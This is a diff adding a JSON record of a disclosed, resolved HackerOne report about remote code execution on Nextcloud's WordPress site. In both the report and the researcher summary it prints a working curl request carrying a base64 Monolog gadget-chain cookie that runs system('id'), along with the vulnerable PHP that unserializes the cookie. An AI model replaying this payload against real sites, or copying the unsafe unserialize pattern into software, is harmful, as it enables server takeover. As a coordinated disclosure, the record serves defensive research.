@@ -1,0 +1,166 @@
+{
+  "id": 2248328,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMjQ4MzI4",
+  "url": "https://hackerone.com/reports/2248328",
+  "title": "RCE on Wordpress website",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2023-11-10T20:55:17.082Z",
+  "submitted_at": "2023-11-10T20:55:17.196Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "lukasreschke",
+    "url": "/lukasreschke",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/037/891/e7fea4d5383dc07d1fe767b02f3bda2bc7639c63_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13291,
+    "url": "https://hackerone.com/nextcloud",
+    "handle": "nextcloud",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Nextcloud",
+      "twitter_handle": "nextclouders",
+      "website": "https://nextcloud.com",
+      "about": "Access, share and protect your files, calendars, contacts, communication & more at home and in your enterprise."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2023-12-28T11:11:00.101Z",
+  "bug_reporter_agreed_on_going_public_at": "2023-11-28T11:10:58.308Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "There is a trivial to exploit Remote Code Execution on nextcloud.com due to unserializing user input.\n\n# Proof of concept\nThe following command will execute the `system('id')` command on the host. As gadget chain I've used Monolog which is included in the PodLove WordPress plugin used on nextcloud.com: \n\n```\ncurl -i -s -k -X $'GET' \\\n    -H $'Host: nextcloud.com' \\\n    -b $'nc_cookie_banner={\\\"essentials\\\":true,\\\"convenience\\\":false,\\\"statistics\\\":{\\\"matomo\\\":false},\\\"external_media\\\":{\\\"youtube\\\":false,\\\"vimeo\\\":false}}; wp-wpml_current_language=en; nc_form_fields=TzozNzoiTW9ub2xvZ1xIYW5kbGVyXEZpbmdlcnNDcm9zc2VkSGFuZGxlciI6NDp7czoxNjoiACoAcGFzc3RocnVMZXZlbCI7aTowO3M6MTA6IgAqAGhhbmRsZXIiO3I6MTtzOjk6IgAqAGJ1ZmZlciI7YToxOntpOjA7YToyOntpOjA7czoyOiJpZCI7czo1OiJsZXZlbCI7aToxMDA7fX1zOjEzOiIAKgBwcm9jZXNzb3JzIjthOjI6e2k6MDtzOjM6InBvcyI7aToxO3M6Njoic3lzdGVtIjt9fQ==' \\\n    $'https://nextcloud.com/newsletter/'\n```\n\nThe last line of the response will contain the output of the `id` command:\n```\n<!-- Performance optimized by Redis Object Cache. Learn more: https://wprediscache.com -->uid=33(www-data) gid=33(www-data) groups=33(www-data)\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n\n# Vulnerable lines of code\nThe `unserialize` call in the below code paths is performed on user-input. (`$_COOKIE['nc_form_fields']`)\n\nhttps://github.com/nextcloud/nextcloud-theme/blob/e6db0a90391ec94f9eb6d86e16dc16e36c5f4dd4/inc/ninjaforms.php#L114\n```php\nadd_filter( 'ninja_forms_render_default_value', 'nc_change_nf_default_value', 10, 3 );\nfunction nc_change_nf_default_value( $default_value, $field_type, $field_settings ) {\n    \n    if(isset($_COOKIE['nc_form_fields'])){\n        $nc_form_fields = unserialize(base64_decode($_COOKIE['nc_form_fields']));\n\n        if( str_contains($field_settings['key'], 'name') && !str_contains($field_settings['key'], 'organization') ){\n                if(isset($nc_form_fields['nc_form_name'])) {\n                    $default_value = $nc_form_fields['nc_form_name'];\n                }\n        }\n        if( str_contains($field_settings['key'], 'email') ){\n                if(isset($nc_form_fields['nc_form_email'])) {\n                    $default_value = $nc_form_fields['nc_form_email'];\n                }\n        }\n        if( str_contains($field_settings['key'], 'phone') ){\n                if(isset($nc_form_fields['nc_form_phone'])) {\n                    $default_value = $nc_form_fields['nc_form_phone'];\n                }\n        }\n    }\n\n  return $default_value;\n}\n```\n\nhttps://github.com/nextcloud/nextcloud-theme/blob/e6db0a90391ec94f9eb6d86e16dc16e36c5f4dd4/inc/ninjaforms.php#L431\n```php\nadd_filter( 'ninja_forms_render_options', function( $options, $settings ) {\n    \n    //https://www.html-code-generator.com/php/array/languages-name-and-code\n    $languages_list = array(\n        'en' => 'English',\n        // [snip]\n        'zu' => 'Zulu - isiZulu'\n    );\n\n    if(str_contains($settings['key'], 'language')) {\n\n        $options = [];\n        $browser_lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);\n\n        $pref_lang = '';\n        if(isset($_COOKIE['nc_form_fields'])){\n            $nc_form_fields = unserialize(base64_decode($_COOKIE['nc_form_fields']));\n            if( isset($nc_form_fields['nc_form_lang'])){\n                $pref_lang = $nc_form_fields['nc_form_lang'];\n            }\n        } else {\n            $pref_lang = $browser_lang;\n        }\n\n\n        foreach($languages_list as $code => $language) {\n            $selected = false;\n\n            if($pref_lang == $code){\n                $selected = true;\n            }\n\n            $options[] = [\n                'label' => $language,\n                'value' => $code,\n                'calc' => 0,\n                'selected' => $selected\n            ];\n\n        }\n        \n    }\n  \n    return $options;\n}, 10, 2 );\n```\n\n## Impact\n\nRCE on the nextcloud.com WordPress instance. I have not tried to escalate up from the host, but I'd assume there is plenty of privilege escalation potential. (or at least the ability to set malicious download links for the Nextcloud binaries)",
+  "weakness": {
+    "id": 52,
+    "name": "Deserialization of Untrusted Data"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 2848383,
+      "file_name": "recording-1699649659147.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/v89ilirv7um056d1c14noardacj3?response-content-disposition=attachment%3B%20filename%3D%22recording-1699649659147.mp4%22%3B%20filename%2A%3DUTF-8%27%27recording-1699649659147.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRMVNBVJP%2F20250920%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250920T193824Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHkaCXVzLXdlc3QtMiJHMEUCIHcVAjNA2oq51zu%2Be%2FIK%2BEP6KHTFuFtsGodwCfZBbTE3AiEAroaxEQUWmE%2FPyTElrjEl72%2BmOlIl20kYtIVxu1yljfQquwUI8v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDMKX43%2B3M330G%2F0m%2FyqPBS%2B0gup44GrJuZb%2BTMKwsibAUMOQy6lZRTPEw6hnozOFD7ctxNNsPQJsjZgHR1HfluQoGyVGZFKS7PVy1coKi2K7zAVrfMZj3x%2BvWUM0La6JkjQ51YvtCT88Ghb9w7wfP%2F79Aqs5pvn3M57aBEj3hxtadewxCVSa%2FA5SJqeEYpcW1SUBnpTqgNO2W%2BOTuXM9tkZrHcLcDKBL4M%2BNkMFuXdb9ySrB%2BhAYSDRt1fEbnNz97aRQLDRiNYidZlT9P24p94ByrqWTJNnahJoGvLzcCdjKdZYgicSyDzqSag4eyebfQq1LnzWi5qhENcZMbVejhpPZq4P%2BZ0wWmn%2BksJXNeST09jlj8avg9d99mCpXlxYtFnFnHs3kQzv%2FklUddFmhXxtpBSA0He4ihE8LQLJZqUu26sS7O2AUs3HqlkhMNDGly87nR4H9rxnOtlj06QzkVNaTKrZ9bSj2mVmlDzY%2B5w8bv0DkUjIEsavz7iFMPr25G3BkSqNz4ZNj0QvS4OrmxkHpVMBvo0CCkCy%2FncpwSaLDlfPPZsp4m3yoYBGH8UzbDMmAUCWKEUGal%2FeLP%2BXb4Phc9etZhPg2pcJqdOzef7AQ4IDLapC6na4sceqWA1sYsg36s4TMbToTDPSWizathDQOC%2FCr%2BRGLimptFaC9%2BlNQrIp2RbjeI2mrr8lv6L0Ev%2FiC8W07qcqVtdDvdk7ByztlX7dGy0J3qbrWV6C4%2F0WITkg7vTf5IHAn4YmLPxzpqmTTs3OrIqo64KFbvDNvRFL9uvuAAuUUsDiujCsh9Hlw3cKEI0UxsP%2BUaeIAz4P0AGdnbnD1ybz7hFvRBFM4Dylj8rsFOCphI2FBqDWp8v3lItNkcBVTQaD2dVz06Q4w2rm7xgY6sQFAdPZxN%2Fs%2BaMGvnlWi96cbO7oayrgvXfzxqobgEtWgUx3G4E6Dm6bnducYA9htR%2FqL1b9Kjaq6ncQXcEWJUaWkvnzXS2Uh%2BBk4tNa09P7p9M6cvZ6dDdngn2qe5JH4hRPy%2Fg8zxf99JZBdCcFg4X0MoQRbLN642njQEtOq21GMasjNKu7tEsbou4s3GsQ7sq5Oaz%2FvxopusVyrIeOe%2FQH2U5DuaATZ58GmAaSOQ6R3vAY%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3afcaf85a60382f401e695da56cd03a1cb705f549a1facb4ed86ff92a508b7e2",
+      "file_size": 170375,
+      "type": "video/mp4",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2023-12-28T11:10:58.432Z",
+  "allow_singular_disclosure_after": -54635245.82787478,
+  "singular_disclosure_allowed": true,
+  "vote_count": 79,
+  "voters": [
+    "lukasreschke",
+    "pinkmeimei",
+    "nesr111",
+    "4c1dr3aper",
+    "muslimfrompk",
+    "8910jq",
+    "orange303",
+    "cxzer0",
+    "skoll101",
+    "sah1dx",
+    "and 69 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.8,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 56,
+    "asset_type": "URL",
+    "asset_identifier": "nextcloud.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 377774,
+      "category": "researcher",
+      "content": "Nextcloud.com is using a custom self-developed theme which was vulnerable to a remote code execution (RCE).\n\nThis was caused due to unserialising user-input from cookies as can be seen at https://github.com/nextcloud/nextcloud-theme/blob/e6db0a90391ec94f9eb6d86e16dc16e36c5f4dd4/inc/ninjaforms.php#L114\n\nAs gadget chain I’ve used Monolog which was also installed, the final exploit to execute arbitrary code (`system(“id”)`) looked like this:\n\n```\ncurl -i -s -k -X $'GET' \\\n    -H $'Host: nextcloud.com' \\\n    -b $'nc_cookie_banner={\\\"essentials\\\":true,\\\"convenience\\\":false,\\\"statistics\\\":{\\\"matomo\\\":false},\\\"external_media\\\":{\\\"youtube\\\":false,\\\"vimeo\\\":false}}; wp-wpml_current_language=en; nc_form_fields=TzozNzoiTW9ub2xvZ1xIYW5kbGVyXEZpbmdlcnNDcm9zc2VkSGFuZGxlciI6NDp7czoxNjoiACoAcGFzc3RocnVMZXZlbCI7aTowO3M6MTA6IgAqAGhhbmRsZXIiO3I6MTtzOjk6IgAqAGJ1ZmZlciI7YToxOntpOjA7YToyOntpOjA7czoyOiJpZCI7czo1OiJsZXZlbCI7aToxMDA7fX1zOjEzOiIAKgBwcm9jZXNzb3JzIjthOjI6e2k6MDtzOjM6InBvcyI7aToxO3M6Njoic3lzdGVtIjt9fQ==' \\\n    $'https://nextcloud.com/newsletter/'\n```\n\nThe response would then contain the reply of the executed code:\n\n```\n<!-- Performance optimized by Redis Object Cache. Learn more: https://wprediscache.com -->uid=33(www-data) gid=33(www-data) groups=33(www-data)\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```",
+      "updated_at": "2023-11-28T11:53:20.380Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 37891,
+        "username": "lukasreschke",
+        "name": "Lukas Reschke",
+        "bio": "",
+        "cleared": false,
+        "verified": true,
+        "website": "https://statuscode.ch",
+        "location": "Germany",
+        "created_at": "2015-08-05T13:37:40.660Z",
+        "url": "https://hackerone.com/lukasreschke",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/000/037/891/e7fea4d5383dc07d1fe767b02f3bda2bc7639c63_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/037/891/e7fea4d5383dc07d1fe767b02f3bda2bc7639c63_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c",
+          "xtralarge": "https://hackerone.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6NTY1NCwicHVyIjoiYmxvYl9pZCJ9fQ==--11306782a4496d819cda895ef27d0929850dc8ba/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJwbmciLCJyZXNpemUiOiIyNjB4MjYwXHUwMDNlIn0sInB1ciI6InZhcmlhdGlvbiJ9fQ==--c155082ce6f9751dcb29cd6ea061a7e4d7329577/878997_(1).png"
+        }
+      }
+    }
+  ]
+}
